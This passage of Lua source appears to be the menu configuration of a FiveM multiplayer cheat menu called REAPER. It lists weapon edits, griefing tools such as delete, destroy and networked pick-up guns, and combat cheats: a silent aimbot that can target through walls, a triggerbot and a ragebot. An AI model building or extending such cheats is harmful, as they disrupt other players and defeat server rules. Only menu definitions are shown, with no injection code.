            {text = 'Perseus camo', dkey = 'weapon:heavysniper_mk2_perseuscamo', desc = 'Enable the perseus camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CAMO_06`},
            {text = 'Leopard camo', dkey = 'weapon:heavysniper_mk2_leopardcamo', desc = 'Enable the leopard camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CAMO_07`},
            {text = 'Zebra camo', dkey = 'weapon:heavysniper_mk2_zebracamo', desc = 'Enable the zebra camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CAMO_08`},
            {text = 'Geometric camo', dkey = 'weapon:heavysniper_mk2_geometriccamo', desc = 'Enable the geometric camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CAMO_09`},
            {text = 'Boom camo', dkey = 'weapon:heavysniper_mk2_boomcamo', desc = 'Enable the boom camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CAMO_10`},
            {text = 'Patriotic camo', dkey = 'weapon:heavysniper_mk2_patrioticcamo', desc = 'Enable the patriotic camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CAMO_IND_01`},
        },
        
        ['weapon:marksmanrifle'] = {
            {text = 'Set ammo', key = 'weapon:marksmanrifle_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', key = 'weapon:marksmanrifle_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', key = 'weapon:marksmanrifle_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', key = 'weapon:marksmanrifle_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', key = 'weapon:marksmanrifle_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:marksmanrifle_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:marksmanrifle_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_CLIP_02`},
            {text = 'Scope', dkey = 'weapon:marksmanrifle_scope', desc = 'Enable the scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM`},
            {text = 'Flashlight', dkey = 'weapon:marksmanrifle_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Suppressor', dkey = 'weapon:marksmanrifle_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP`},
            {text = 'Grip', dkey = 'weapon:marksmanrifle_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_AFGRIP`},
            {text = 'Luxury variant', dkey = 'weapon:marksmanrifle_luxuryvariant', desc = 'Enable the luxury variant.', afu = __REAPER1__.M.weapon.editor.luxuryvariant, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_VARMOD_LUXE`},
        },
        
        ['weapon:grenadelauncher'] = {
            {text = 'Set ammo', dkey = 'weapon:grenadelauncher_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:grenadelauncher_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:grenadelauncher_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:grenadelauncher_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:grenadelauncher_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:grenadelauncher_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_GRENADELAUNCHER_CLIP_01`},
            {text = 'Scope', dkey = 'weapon:grenadelauncher_scope', desc = 'Enable the scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM`},
            {text = 'Flashlight', dkey = 'weapon:grenadelauncher_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Grip', dkey = 'weapon:grenadelauncher_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_SMALL`},
        },

        ['weapon:modifier'] = {
            {text = 'Exploding bullets', dkey = 'weapon:modifier_explodingbullet', desc = 'Enable exploding bullets.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Type', dkey = 'weapon:modifier_type', desc = 'Set the explosion type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Explosion type', length = 20, tipus = 'betu', func = __REAPER1__.T.Explosions},
            {text = 'Damage', dkey = 'weapon:modifier_damage', desc = 'Set the explosion damage range.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Explosion damage number', length = 10, tipus = 'szam', func = 0},
            {text = 'Explosion', dkey = 'weapon:modifier_explosion', desc = 'Edit the explosion config.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Explosion config', length = 20, tipus = 'vegyes', func = {'None', 'Visible', 'Audible', 'Visible & Audible'}},
            {text = 'Shake', dkey = 'weapon:modifier_shake', desc = 'Explosion camera shake strength.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Shake number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Force gun', option = __REAPER1__.M.Separator},
            {text = 'Force gun', dkey = 'weapon:modifier_forcegun', desc = 'Enable the force gun.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Strength', dkey = 'weapon:modifier_strength', desc = 'The strength of the applied force.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Strength number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Pedestrians', dkey = 'weapon:modifier_pedestrians', desc = 'Include pedestrians.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Vehicles', dkey = 'weapon:modifier_vehicles', desc = 'Include vehicles.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Teleport gun', option = __REAPER1__.M.Separator},
            {text = 'Teleport gun', dkey = 'weapon:modifier_teleportgun', desc = 'Enable the teleport gun.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Add to coords', dkey = 'weapon:modifier_addtocoords', desc = 'Add a value to the end coords.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Coord multiplier number', length = 3, tipus = 'szam', func = {0.0, 0.5, 1.0, 1.5, 2.0, 2.5, 3.0, 3.5, 4.0, 4.5, 5.0}},
            {text = 'Sound', dkey = 'weapon:modifier_tsound', desc = 'Toggle the sound for the teleport gun.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Effect', dkey = 'weapon:modifier_teffect', desc = 'Toggle the effect for the teleport gun.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Pick up gun', option = __REAPER1__.M.Separator},
            {text = 'Pick up gun', dkey = 'weapon:modifier_pickupgun', desc = 'Enable the pick up gun.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Speed', dkey = 'weapon:modifier_speed', desc = 'Set the scrolling strength.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Speed number', length = 2, tipus = 'szam', func = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}},
            {text = 'Synced', dkey = 'weapon:modifier_synced', desc = 'Enable so moving an entity will be\nnetworked with other players.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Entity alpha', dkey = 'weapon:modifier_entityalpha', desc = 'Set an alpha for the grabbed entity.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Alpha number', length = 3, tipus = 'vegyes', func = __REAPER1__.T.AlphaValues},
            {text = 'Keep alpha', dkey = 'weapon:modifier_keepalpha', desc = 'Toggle if the entity should keep the\nset alpha after letting go of it.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Sound', dkey = 'weapon:modifier_psound', desc = 'Toggle the sound for the pick up gun.', option = __REAPER1__.M.Checkbox, func = false},
        },
    
        ['weapon:entitygun'] = {
            {text = 'Vehicle', dkey = 'weapon:entitygun_vehicle', desc = 'The vehicle which will be created.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle name', length = 20, tipus = 'betu', toggle = false, func = {'Cargoplane', 'Skylift', 'Blimp', 'Maverick', 'Cargobob', 'Tank', 'Dump Truck', 'Insurgent', 'Liberator', 'Dubsta 6x6', 'Train', 'Metro Train', 'Tractor', 'Bulldozer', 'Bus', 'Destroyed ruiner', 'Neon', 'Police', 'Tug'}},
            {text = 'Pedestrian', dkey = 'weapon:entitygun_pedestrian', desc = 'The pedestrian which will be createdt.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Pedestrian name', length = 20, tipus = 'betu', toggle = false, func = {'Male freemode', 'Female freemode','Big foot','Alien','Spaceman','Bogdangoon','Corpse','Cult','Nude','Merryweather','Stripper','Chemistry worker','Cocaine','Clown','Monkey','Juggernaut','Ranger','Zombie', 'Dolphin', 'Pig', 'Pigeon', 'Cow', 'Chimp'}},
            {text = 'Object', dkey = 'weapon:entitygun_object', desc = 'The object which will be created.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Object name', length = 20, tipus = 'betu', toggle = false, func = {'Explosive barrel', 'Windmill', 'Ufo', 'Ball', 'Tree', 'Dildo', 'Blackhole', 'Security hut', 'Alien egg', 'Landing zone', 'Radar', 'Pierro wheel', 'Towercrane', 'Parking wand'}},
            {text = 'Config', option = __REAPER1__.M.Separator},
            {text = 'Disable firing', dkey = 'weapon:entitygun_disablefiring', desc = 'Disable firing when shooting a entity.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Hold button', dkey = 'weapon:entitygun_holdbutton', desc = 'Enable so you can hold the button\nto shoot entities.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Strength', dkey = 'weapon:entitygun_strength', desc = 'The strength of how fast the shot\nentity should go.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Strength number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'God moded', dkey = 'weapon:entitygun_godmoded', desc = 'Make the created entity god moded.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Invisible', dkey = 'weapon:entitygun_invisible', desc = 'Make the created entity invisible.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Clean up', dkey = 'weapon:entitygun_cleanup', desc = 'The entity will be deleted shortly after it was created.', option = __REAPER1__.M.Checkbox, func = false},
        },
    
        ['weapon:ammo'] = {
            {text = 'Particle ammo', dkey = 'weapon:ammo_particleammo', desc = 'A particle to play on impact.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Particle name', length = 3, tipus = 'vegyes', toggle = false, toggle = false, func = {'Explosion', 'Explosion 2', 'Clown 1', 'Clown 2', 'Fireworks', 'Fireworks 2', 'Alien', 'Alien 2', 'Water', 'Beam', 'Splash'}},
            {text = 'Modify ammo', dkey = 'weapon:ammo_modifyammo', desc = 'Modify your ammo.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo name', length = 3, tipus = 'vegyes', toggle = false, func = {'Green laser', 'Red laser', 'RPG', 'Firework', 'Ball', 'Grenade', 'Molotov'}},
            {text = 'Ammo types', option = __REAPER1__.M.Separator},
            {text = 'Airstrike gun', dkey = 'weapon:ammo_airstrikegun', desc = 'Shoot a rocket from the sky.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Drive it gun', dkey = 'weapon:ammo_driveitgun', desc = 'Drive the vehicle your bullet impacts.\nCan be risky if a player is in the driver\nseat.', option = __REAPER1__.M.Checkbox, func = false, risky = true},
            {text = 'Fire bullets', dkey = 'weapon:ammo_firebullets', desc = 'Fire will be caused on impact.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Delete gun', dkey = 'weapon:ammo_deletegun', desc = 'Delete the impacted entity.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Paint gun', dkey = 'weapon:ammo_paintgun', desc = 'Paint the impacted vehicle.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Sling shot gun', dkey = 'weapon:ammo_slingshotgun', desc = 'Launch yourself in the shot direction.\nPress any movement key to stop.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Revive gun', dkey = 'weapon:ammo_revivegun', desc = 'Revive the impacted ped.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Destroy gun', dkey = 'weapon:ammo_destroygun', desc = 'Destroy the impacted vehicle, or kill the\nimpacted ped.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Shrink gun', dkey = 'weapon:ammo_shrinkgun', desc = 'Shrink the impacted ped.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'No collision gun', dkey = 'weapon:ammo_nocollisiongun', desc = 'Disable the collision of the impacted entity.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'No gravity gun', dkey = 'weapon:ammo_nogravitygun', desc = 'Disable the gravity of the impacted vehicle.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Freeze gun', dkey = 'weapon:ammo_freezegun', desc = 'Freeze the impacted entity.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Fix gun', dkey = 'weapon:ammo_fixgun', desc = 'Fix the impacted vehicle.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Mind clear gun', dkey = 'weapon:ammo_mindcleargun', desc = 'Clear the mind of the impacted ped.', option = __REAPER1__.M.Checkbox, func = false},
        },

        ['weapon:debuggun'] = {
            {text = 'Debug gun', dkey = 'weapon:debuggun_debuggun', desc = 'Aim and left click on a entity to\nshow debug info.', afu = __REAPER1__.M.weapon.debuggun.debuggun, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Gun dependent', dkey = 'weapon:debuggun_gundependent', desc = 'If not gun dependent you dont have\nto aim with a gun to debug.', option = __REAPER1__.M.Checkbox, func = true},
            {text = 'Distance', dkey = 'weapon:debuggun_distance', desc = 'The maximum distance where the\ndebug information should be visible\nfrom.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Distance number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Rectangle', dkey = 'weapon:debuggun_rectangle', desc = 'Enable a rectangle behind the\ninformation.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Rectangle distance', dkey = 'weapon:debuggun_rectangledistance', desc = 'The maximum distance where the\nrectangle should be visible from.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Distance number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Rectangle color', dkey = 'weapon:debuggun_rectanglecolor', desc = 'Set the color and alpha of the rectangle.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Rectangle color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
        },
    
        ['combat'] = {
            {text = 'Aimbot', dkey = 'combat:aimbot', desc = 'Aimbot menu.', option = __REAPER1__.M.Menu_Button, func = {'combat', 'combat:aimbot'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Triggerbot', dkey = 'combat:triggerbot', desc = 'Triggerbot menu.', option = __REAPER1__.M.Menu_Button, func = {'combat', 'combat:triggerbot'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Ragebot', dkey = 'combat:ragebot', desc = 'Ragebot menu.', option = __REAPER1__.M.Menu_Button, func = {'combat', 'combat:ragebot'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Visuals', dkey = 'combat:visuals', desc = 'Visuals menu.', option = __REAPER1__.M.Menu_Button, func = {'combat', 'combat:visuals'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Crosshair', dkey = 'combat:crosshair', desc = 'Crosshair menu.', option = __REAPER1__.M.Menu_Button, func = {'combat', 'combat:crosshair'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Movement', option = __REAPER1__.M.Separator},
            {text = 'Anti aim', dkey = 'combat_antiaim', desc = 'Anti aim to fake something that you pick.', afu = __REAPER1__.M.combat.aa, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Choose an anti aim type', length = 10, tipus = 'betu', toggle = false, func = {'Random', 'Combatroll', 'Jump', 'Crouch', 'Kick', 'Swing', 'Swing 2', 'Back Swing'}},
            {text = 'Exception', dkey = 'combat_exception', desc = 'Only anti aim when one of the selected\nthings are active.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Anti aim exception', length = 10, tipus = 'betu', toggle = false, func = {'Aiming', 'Shooting', 'Running'}},
            {text = 'Until finished', dkey = 'combat_untilfinished', desc = 'Don\'t start another anti aim until the\ncurrent one didn\'t finish.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Infinite combatroll', dkey = 'combat_infroll', desc = 'blabla.', afu = __REAPER1__.M.combat.infinitecombatroll, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Hit marker', option = __REAPER1__.M.Separator},
            {text = 'Hit marker', dkey = 'combat_hitmarker', desc = 'Enable hit markers. Can\'t detect\nshooting through stuff yet.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Position', dkey = 'combat_position', desc = 'The position where the hitmarker should be.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hit marker position', length = 20, tipus = 'vegyes', func = {'Center', 'Enemy hit'}},
            {text = 'Type', dkey = 'combat_htype', desc = 'Pick the type of the hitmarker.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hit marker type', length = 20, tipus = 'vegyes', func = {'Default', 'Neon (only green)'}},
            {text = 'Duration', dkey = 'combat_duration', desc = 'The duration of the hit marker in\nmiliseconds.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hit marker size number', length = 5, tipus = 'szam', func = __REAPER1__.T.Tizezres},
            {text = 'Color', dkey = 'combat_color', desc = 'Set the color and alpha of the hitmarker.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Hit marker color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Size', dkey = 'combat_size', desc = 'Size of the hit marker.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hit marker size number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Hit sound', option = __REAPER1__.M.Separator},
            {text = 'Hit sound', dkey = 'combat_hitsound', desc = 'Enable hit sounds.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Type', dkey = 'combat_type', desc = 'Pick a hit sound.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hit sound name', length = 20, tipus = 'vegyes', func = {'Cod', 'Skeet', 'Bullet', 'Metal', 'Bubble', 'Goodnight', 'Mc dmg', 'Mc xp', 'Gah'}},
            {text = 'Delay', dkey = 'combat_delay', desc = 'Delay after the hit sound should play\nin miliseconds.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hit sound delay number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Custom sound', dkey = 'combat_customsound', desc = 'Enter a full webpage link with a\ncustom sound. Example:\nhttps://youtube.com/asdasd', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Enter custom sound link', length = 10, tipus = 'vegyes', func = 0},
        },
        
        ['combat:aimbot'] = {
            {text = 'Aimbot', dkey = 'combat:aimbot_aimbot', desc = 'Enable the aimbot.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Silent', dkey = 'combat:aimbot_silent', desc = 'Enable to have a silent aimbot.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Target', dkey = 'combat:aimbot_target', desc = 'The targeting of the aimbot.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Aimbot targeting', length = 10, tipus = 'betu', func = {'Closest', 'Fov'}},
            {text = 'Bone', dkey = 'combat:aimbot_bone', desc = 'The bone where the aimbot\nshould snap to.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Aimbot bone', length = 20, tipus = 'betu', menuextra = 'image_aimbot_bone', func = {'Random', "Head", "Neck", "Spine", "Spine 1", "Spine 2", "Spine 3", "Left Upperarm", "Right Upperarm", "Left Forearm", "Right Forearm", "Left Tight", "Right Tight", "Left foot", "Right foot"}},
            {text = 'On key', dkey = 'combat:aimbot_onkey', desc = 'If enabled, the aimbot will only work\nwhen the desired key is pressed.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Aimbot key', length = 5, tipus = 'vegyes', toggle = false, func = __REAPER1__.T.Keys},
            {text = 'Config', option = __REAPER1__.M.Separator},
            {text = 'Distance type', dkey = 'combat:aimbot_distancetype', desc = 'The type of the distance check.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Aimbot distance type', length = 10, tipus = 'betu', func = {'None', 'Normal', 'Gun range'}},
            {text = 'Distance', dkey = 'combat:aimbot_distance', desc = 'The distance within the aimbot\nshould work.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Aimbot distance number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres},
            {text = 'Targeting list', dkey = 'combat:aimbot_targetinglist', desc = 'Ignore or only target the targeting list.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Aimbot targeting list', length = 5, tipus = 'vegyes', toggle = false, func = {'Ignore', 'Target'}},
            {text = 'Sync shot', dkey = 'combat:aimbot_syncshot', desc = 'Enable so the shots will be multiplied,\nto avoid desync.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sync shot amount number', length = 2, tipus = 'vegyes', toggle = false, func = {2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15}},
            {text = 'Hit chance', dkey = 'combat:aimbot_hitchance', desc = 'The aimbot\'s hit chance.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Aimbot hit chance number', length = 3, tipus = 'szam', toggle = false, func = __REAPER1__.T.Szazas},
            {text = 'Auto aim', dkey = 'combat:aimbot_autoaim', desc = 'Automatically aim at the target.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Aim only', dkey = 'combat:aimbot_aimonly', desc = 'Enable so the aimbot will only work\nif aiming.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Only players', dkey = 'combat:aimbot_onlyplayers', desc = 'Only target players, not peds.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Vehicles', dkey = 'combat:aimbot_vehicles', desc = 'Snap to the target if in vehicle.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Long range', dkey = 'combat:aimbot_longrange', desc = 'Aimbot will be more precise for targets\nfar away but not for close range.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Lock on', dkey = 'combat:aimbot_lockon', desc = 'Lock onto the first target. Won\'t target\nothers till locked.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Max damage', dkey = 'combat:aimbot_maxdamage', desc = 'The maximum damage that the\naimbot can do.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Aimbot maximum damage number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Occluded', dkey = 'combat:aimbot_occluded', desc = 'Snap on the target when occluded.\n(Through walls)', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Target invisible', dkey = 'combat:aimbot_targetinvisible', desc = 'Target invisible peds too.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Fov', option = __REAPER1__.M.Separator},
            {text = 'Draw', dkey = 'combat:aimbot_draw', desc = 'Draw the fov.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Type', dkey = 'combat:aimbot_type', desc = 'Empty fov only works with game version:\n2189 or higher.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Aimbot fov type', length = 15, tipus = 'betu', func = {'Fill', 'Empty'}},
            {text = 'Range', dkey = 'combat:aimbot_range', desc = 'The range of the fov. Supports floats too\n(ex: 37.821).', afu = __REAPER1__.M.combat.aimbot.buildfov, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Fov range number', length = 10, tipus = 'vegyes', func = 0.0},
            {text = 'Color type', dkey = 'combat:aimbot_fcolortype', desc = 'Color type of the aimbot fov.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Aimbot fov color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'combat:aimbot_fcolor', desc = 'Set the aimbot fov color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Aimbot fov color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Hitbox', option = __REAPER1__.M.Separator},
            {text = 'Draw hitbox', dkey = 'combat:aimbot_drawhitbox', desc = 'Draw the aimbot hitbox.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Only on ped', dkey = 'combat:aimbot_onlyonped', desc = 'Draw the aimbot hitbox only on the\npedestrian.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Color type', dkey = 'combat:aimbot_colortype', desc = 'Color type of the aimbot hitbox.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Aimbot hitbox color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'combat:aimbot_color', desc = 'Set the aimbot hitbox color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Aimbot hitbox color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Misc', option = __REAPER1__.M.Separator},
            {text = 'Hit chance text', dkey = 'combat:aimbot_hitchancetext', desc = 'Toggle the miss due to hit chance text.', option = __REAPER1__.M.Checkbox, func = false},
        },

        ['combat:triggerbot'] = {
            {text = 'Triggerbot', dkey = 'combat:triggerbot_triggerbot', desc = 'Enable the triggerbot.', option = __REAPER1__.M.Checkbox, func = false},
